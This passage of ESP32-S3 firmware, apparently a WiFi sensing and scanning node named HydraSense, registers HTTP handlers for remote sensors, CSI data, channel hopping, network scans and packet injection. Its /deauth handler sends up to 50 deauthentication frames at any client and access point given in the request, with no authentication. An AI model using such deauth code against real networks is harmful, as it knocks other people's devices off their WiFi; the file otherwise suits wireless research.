      rem["ip"] = remotes[i].ip.toString();
      rem["rssi"] = remotes[i].rssi_to_primary;
      rem["last_seen_us"] = remotes[i].last_seen;
    }
  }
  xSemaphoreGive(remote_mux);
  
  String output;
  serializeJson(doc, output);
  http_server.send(200, "application/json", output);
}

void handleRemoteData() {
  if (!http_server.hasArg("plain")) {
    http_server.send(400, "text/plain", "Missing body");
    return;
  }
  
  String body = http_server.arg("plain");
  JsonDocument doc;
  DeserializationError err = deserializeJson(doc, body);
  
  if (err) {
    http_server.send(400, "text/plain", "Invalid JSON");
    return;
  }
  
  String node_id = doc["node_id"] | "unknown";
  IPAddress client_ip = http_server.client().remoteIP();
  
  // Register/update remote node
  xSemaphoreTake(remote_mux, portMAX_DELAY);
  int slot = -1;
  for (int i = 0; i < MAX_REMOTES; i++) {
    if (remotes[i].active && remotes[i].node_id == node_id) {
      slot = i;
      break;
    }
    if (slot < 0 && !remotes[i].active) {
      slot = i;
    }
  }
  
  if (slot >= 0) {
    if (!remotes[slot].active) {
      remote_count++;
      remotes[slot].active = true;
      remotes[slot].node_id = node_id;
    }
    remotes[slot].ip = client_ip;
    remotes[slot].last_seen = getMicros64();
    remotes[slot].rssi_to_primary = doc["rssi_to_primary"] | 0;
    
    // Process remote's detection data
    JsonArray scans = doc["scans"].as<JsonArray>();
    for (JsonObject scan : scans) {
      WiFiDetection det;
      memset(&det, 0, sizeof(det));
      
      det.timestamp_us = scan["ts"] | getMicros64();
      det.rssi = scan["rssi"] | 0;
      det.channel = scan["ch"] | 0;
      
      String mac_str = scan["mac"] | "";
      if (mac_str.length() == 17) {
        sscanf(mac_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &det.mac[0], &det.mac[1], &det.mac[2],
               &det.mac[3], &det.mac[4], &det.mac[5]);
      }
      
      det.has_csi = false;
      
      // Tag this as from remote for triangulation
      det.antenna = slot + 100;  // Mark as remote node data
      
      portENTER_CRITICAL(&detection_mux);
      uint16_t idx = detection_head;
      detection_head = (detection_head + 1) % MAX_DETECTIONS;
      if (detection_count_val < MAX_DETECTIONS) detection_count_val++;
      detections[idx] = det;
      portEXIT_CRITICAL(&detection_mux);
    }
  }
  xSemaphoreGive(remote_mux);
  
  // Send sync response with current timestamp
  JsonDocument resp;
  resp["status"] = "ok";
  resp["server_ts"] = getMicros64();
  resp["your_slot"] = slot;
  
  String output;
  serializeJson(resp, output);
  http_server.send(200, "application/json", output);
}

void handleFirmware() {
  if (!SPIFFS.exists("/firmware.bin")) {
    http_server.send(404, "text/plain", "No firmware available");
    return;
  }
  
  File f = SPIFFS.open("/firmware.bin", "r");
  http_server.streamFile(f, "application/octet-stream");
  f.close();
}

void handleSetChannel() {
  if (http_server.hasArg("ch")) {
    uint8_t ch = http_server.arg("ch").toInt();
    if (ch >= 1 && ch <= 13) {
      // Temporarily stop channel hopping
      if (channel_hop_task) {
        vTaskSuspend(channel_hop_task);
      }
      current_channel = ch;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      http_server.send(200, "text/plain", "Channel set to " + String(ch));
      return;
    }
  }
  http_server.send(400, "text/plain", "Invalid channel (1-13)");
}

void handleResumeHopping() {
  if (channel_hop_task) {
    vTaskResume(channel_hop_task);
  }
  http_server.send(200, "text/plain", "Channel hopping resumed");
}

void handleSetConfig() {
  // Validate request has required parameters
  if (!http_server.hasArg("wifi_ssid") || !http_server.hasArg("wifi_pass")) {
    http_server.send(400, "application/json", "{\"error\":\"Missing wifi_ssid or wifi_pass\"}");
    return;
  }
  
  String new_ssid = http_server.arg("wifi_ssid");
  String new_pass = http_server.arg("wifi_pass");
  
  // Validate lengths
  if (new_ssid.length() == 0 || new_ssid.length() > 31) {
    http_server.send(400, "application/json", "{\"error\":\"Invalid SSID length (1-31 chars)\"}");
    return;
  }
  if (new_pass.length() < 8 || new_pass.length() > 63) {
    http_server.send(400, "application/json", "{\"error\":\"Invalid password length (8-63 chars)\"}");
    return;
  }
  
  // Save to NVS
  preferences.putString("wifi_ssid", new_ssid);
  preferences.putString("wifi_pass", new_pass);
  
  // Update runtime values
  strncpy(WIFI_SSID, new_ssid.c_str(), 32);
  strncpy(WIFI_PASS, new_pass.c_str(), 64);
  
  Serial.printf("[CONFIG] WiFi credentials updated: SSID=%s\n", WIFI_SSID);
  
  http_server.send(200, "application/json", "{\"status\":\"ok\",\"message\":\"Config saved. Restart to apply.\"}");
}

void handleGetCSI() {
  // Return latest CSI data if available - use portMUX for spinlock
  portENTER_CRITICAL(&csi_mux);
  
  if (!csi_enabled || last_csi_len == 0) {
    portEXIT_CRITICAL(&csi_mux);
    http_server.send(200, "application/json", "{\"csi_enabled\":false,\"data\":null}");
    return;
  }
  
  // Copy data while holding lock
  uint8_t len_copy = last_csi_len;
  int8_t data_copy[128];
  uint8_t mac_copy[6];
  uint64_t ts_copy = last_csi_ts;
  memcpy(data_copy, last_csi_data, len_copy);
  memcpy(mac_copy, last_csi_mac, 6);
  portEXIT_CRITICAL(&csi_mux);
  
  String json = "{\"csi_enabled\":true,\"timestamp\":" + String(ts_copy) + 
                ",\"len\":" + String(len_copy) + 
                ",\"mac\":\"" + String(mac_copy[0], HEX) + ":" + 
                String(mac_copy[1], HEX) + ":" + String(mac_copy[2], HEX) + ":" +
                String(mac_copy[3], HEX) + ":" + String(mac_copy[4], HEX) + ":" +
                String(mac_copy[5], HEX) + "\",\"data\":[";
  
  for (int i = 0; i < len_copy && i < 128; i++) {
    if (i > 0) json += ",";
    json += String(data_copy[i]);
  }
  json += "]}";
  
  http_server.send(200, "application/json", json);
}

// ============== Packet Injection HTTP Handlers ==============

// Network scanner - returns discovered networks (nmap-style)
void handleNetworkScan() {
  JsonDocument doc;
  doc["timestamp"] = getMicros64();
  doc["total_networks"] = scan_result_count;
  doc["injected_probes"] = injected_probes;
  
  JsonArray networks = doc["networks"].to<JsonArray>();
  
  portENTER_CRITICAL(&scan_mux);
  for (int i = 0; i < scan_result_count; i++) {
    NetworkScanResult& n = scan_results[i];
    JsonObject net = networks.add<JsonObject>();
    net["bssid"] = macToString(n.bssid);
    net["ssid"] = n.ssid;
    net["rssi"] = n.rssi;
    net["channel"] = n.channel;
    net["encryption"] = n.encryption;
    net["hidden"] = n.is_hidden;
    net["beacons"] = n.beacon_count;
    net["clients"] = n.clients_seen;
  }
  portEXIT_CRITICAL(&scan_mux);
  
  String output;
  serializeJson(doc, output);
  http_server.send(200, "application/json", output);
}

// Trigger active probe scan (like nmap -sn for WiFi)
void handleProbeScan() {
  String ssid = http_server.hasArg("ssid") ? http_server.arg("ssid") : "";
  
  probeAllChannels(ssid.length() > 0 ? ssid.c_str() : NULL);
  
  JsonDocument doc;
  doc["status"] = "ok";
  doc["probes_sent"] = NUM_CHANNELS;
  doc["target_ssid"] = ssid.length() > 0 ? ssid : "broadcast";
  
  String output;
  serializeJson(doc, output);
  http_server.send(200, "application/json", output);
}

// Deauth endpoint (for authorized security testing only)
void handleDeauth() {
  if (!http_server.hasArg("target") || !http_server.hasArg("bssid")) {
    http_server.send(400, "application/json", "{\"error\":\"Missing target or bssid parameter\"}");
    return;
  }
  
  String target_str = http_server.arg("target");
  String bssid_str = http_server.arg("bssid");
  int count = http_server.hasArg("count") ? http_server.arg("count").toInt() : 3;
  int channel = http_server.hasArg("channel") ? http_server.arg("channel").toInt() : current_channel;
  
  if (count < 1) count = 1;
  if (count > 50) count = 50;  // Safety limit
  
  // Parse MAC addresses
  uint8_t target[6], bssid[6];
  if (sscanf(target_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &target[0], &target[1], &target[2], &target[3], &target[4], &target[5]) != 6) {
    http_server.send(400, "application/json", "{\"error\":\"Invalid target MAC format\"}");
    return;
  }
  if (sscanf(bssid_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]) != 6) {
    http_server.send(400, "application/json", "{\"error\":\"Invalid BSSID MAC format\"}");
    return;
  }
  
  esp_err_t result = sendDeauth(target, bssid, channel, count);
  
  JsonDocument doc;
  doc["status"] = result == ESP_OK ? "ok" : "error";
  doc["frames_sent"] = count;
  doc["target"] = target_str;
  doc["bssid"] = bssid_str;
  doc["channel"] = channel;
  doc["total_deauths"] = injected_deauths;
  
  String output;
  serializeJson(doc, output);
  http_server.send(result == ESP_OK ? 200 : 500, "application/json", output);
}

// Get injection statistics
void handleInjectionStats() {
  JsonDocument doc;
  doc["injection_enabled"] = injection_enabled;
  doc["deauth_frames_sent"] = injected_deauths;
  doc["probe_requests_sent"] = injected_probes;
  doc["beacon_frames_sent"] = injected_beacons;
  doc["networks_discovered"] = scan_result_count;
  
  String output;
  serializeJson(doc, output);
  http_server.send(200, "application/json", output);
}

// Enable/disable injection
void handleSetInjection() {
  if (http_server.hasArg("enabled")) {
    injection_enabled = (http_server.arg("enabled") == "true" || http_server.arg("enabled") == "1");
  }
  
  JsonDocument doc;
  doc["injection_enabled"] = injection_enabled;
  
  String output;
  serializeJson(doc, output);
  http_server.send(200, "application/json", output);
}

// Clear scan results
void handleClearScan() {
  portENTER_CRITICAL(&scan_mux);
  scan_result_count = 0;
  memset(scan_results, 0, sizeof(scan_results));
  portEXIT_CRITICAL(&scan_mux);
  
  http_server.send(200, "application/json", "{\"status\":\"ok\",\"message\":\"Scan results cleared\"}");
}

// ============== Setup ==============

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n\n");
  Serial.println("╔══════════════════════════════════════════════════════════╗");
  Serial.println("║     HydraSense WiFi Network Scanner + Packet Injection  ║");
  Serial.println("║        ESP32-S3 Sensing Node v3.1 (nmap + deauth)       ║");
  Serial.println("╚══════════════════════════════════════════════════════════╝");
  
  boot_time_us = getMicros64();
  
  // Initialize NVS preferences for configuration
  preferences.begin("hydra", false);
  String saved_ssid = preferences.getString("wifi_ssid", "");
  String saved_pass = preferences.getString("wifi_pass", "");
  if (saved_ssid.length() > 0) {
    strncpy(WIFI_SSID, saved_ssid.c_str(), 32);
    strncpy(WIFI_PASS, saved_pass.c_str(), 64);
    Serial.println("✓ Loaded WiFi config from NVS");
  }
  
  // Initialize watchdog
  esp_task_wdt_config_t wdt_config = {
    .timeout_ms = WDT_TIMEOUT_S * 1000,
    .idle_core_mask = 0,
    .trigger_panic = true
  };
  esp_task_wdt_reconfigure(&wdt_config);
  esp_task_wdt_add(NULL);
  Serial.printf("✓ Watchdog configured (%ds timeout)\n", WDT_TIMEOUT_S);
  
  // Initialize SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("⚠️  SPIFFS mount failed");
  } else {
    Serial.println("✓ SPIFFS mounted");
  }
  
  // Initialize semaphores
  remote_mux = xSemaphoreCreateMutex();
  
  // Configure WiFi in AP+STA mode
  WiFi.mode(WIFI_MODE_APSTA);
  
  // Start AP for remote sensors
  WiFi.softAP(AP_SSID, AP_PASS, 1, 0, MAX_REMOTES);
  Serial.printf("✓ AP started: %s @ %s\n", AP_SSID, WiFi.softAPIP().toString().c_str());
  
  // Connect to home WiFi network
  Serial.printf("📡 Connecting to WiFi: %s", WIFI_SSID);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  
  int wifi_timeout = 0;
  while (WiFi.status() != WL_CONNECTED && wifi_timeout < 30) {
    delay(500);
    Serial.print(".");
    wifi_timeout++;
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.printf("\n✓ Connected to %s\n", WIFI_SSID);
    Serial.printf("   STA IP: %s\n", WiFi.localIP().toString().c_str());
    
    // Start mDNS so computer can find us at hydrasense.local
    if (MDNS.begin(MDNS_NAME)) {
      MDNS.addService("http", "tcp", HTTP_PORT);
      MDNS.addService("hydrasense", "tcp", STREAM_PORT);
      Serial.printf("✓ mDNS started: %s.local\n", MDNS_NAME);
    }
  } else {
    Serial.println("\n⚠️  Could not connect to WiFi - AP mode only");
  }
  
  // Configure promiscuous mode with all packet types
  wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
  };
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&promiscuousCallback);
  
  Serial.println("✓ Promiscuous mode enabled");
  
  // Enable CSI extraction
  enableCSI();
  
  // Setup HTTP endpoints
  http_server.on("/", handleRoot);
  http_server.on("/status", handleStatus);
  http_server.on("/scan", handleScan);
  http_server.on("/remotes", handleRemotes);
  http_server.on("/remote_data", HTTP_POST, handleRemoteData);
  http_server.on("/firmware.bin", handleFirmware);
  http_server.on("/set_channel", handleSetChannel);
  http_server.on("/resume_hopping", handleResumeHopping);
  http_server.on("/setConfig", HTTP_POST, handleSetConfig);
  http_server.on("/csi", handleGetCSI);
  
  // Packet injection endpoints (nmap-style network scanning)
  http_server.on("/netscan", handleNetworkScan);        // GET discovered networks
  http_server.on("/probe", handleProbeScan);            // Trigger active probe scan
  http_server.on("/deauth", HTTP_POST, handleDeauth);   // Send deauth frames (security testing)
  http_server.on("/injection/stats", handleInjectionStats);  // Get injection statistics
  http_server.on("/injection/enable", HTTP_POST, handleSetInjection);  // Enable/disable injection
  http_server.on("/netscan/clear", handleClearScan);    // Clear scan results
  
  http_server.begin();
  
  Serial.printf("✓ HTTP server on port %d\n", HTTP_PORT);
  Serial.println("✓ Packet injection endpoints enabled");
  
  // Start stream server
  stream_server.begin();
  Serial.printf("✓ Stream server on port %d\n", STREAM_PORT);
  
  // Start background tasks
  xTaskCreatePinnedToCore(channelHopTask, "ChannelHop", 2048, NULL, 1, &channel_hop_task, 0);
  xTaskCreatePinnedToCore(statsTask, "Stats", 2048, NULL, 1, &stats_task, 0);
  xTaskCreatePinnedToCore(streamTask, "Stream", 8192, NULL, 2, &stream_task, 1);
  
  Serial.println("✓ Background tasks started");
  Serial.println("\n📡 Ready for environment sensing!");
  Serial.printf("   AP: %s / %s @ %s\n", AP_SSID, AP_PASS, WiFi.softAPIP().toString().c_str());
  if (WiFi.status() == WL_CONNECTED) {
    Serial.printf("   Network: %s @ %s\n", WIFI_SSID, WiFi.localIP().toString().c_str());
    Serial.printf("   mDNS: http://%s.local/\n", MDNS_NAME);
  }
  Serial.printf("   Stream: tcp://%s:%d\n\n", WiFi.localIP().toString().c_str(), STREAM_PORT);
}

// ============== Main Loop ==============

void loop() {
  http_server.handleClient();
  
  // Feed watchdog
  esp_task_wdt_reset();
  
  // Periodic status output
  static uint32_t last_status = 0;
  if (millis() - last_status > 5000) {
    last_status = millis();
    Serial.printf("📊 PPS: %lu | Total: %lu | CH: %d | Det: %d | Remotes: %d | CSI: %s | Heap: %lu\n",
                  packets_per_second, total_packets, current_channel, 
                  detection_count_val, remote_count, csi_enabled ? "Y" : "N", ESP.getFreeHeap());
  }
  
  delay(1);
}
